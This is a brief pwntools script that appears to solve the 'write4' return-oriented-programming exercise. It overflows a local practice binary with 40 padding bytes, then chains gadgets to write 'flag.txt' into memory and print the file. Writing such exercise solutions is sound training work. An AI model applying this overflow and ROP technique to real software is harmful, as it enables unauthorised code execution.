from pwn import *

p = process('./write4')
# gdb.attach(p, gdbscript='b *main')

pop_1415 = p64(0x400690)
r14 = p64(0x601038)
r15 = b"flag.txt"
mov = p64(0x400628)
pop_rdi = p64(0x400693)
print_f = p64(0x400510)

payload = b"A" * 40
payload += pop_1415 + r14 + r15
payload += mov
payload += pop_rdi + r14
payload += print_f

p.sendline(payload)


# p.interactive()
print(p.recvall().decode('utf-8'))
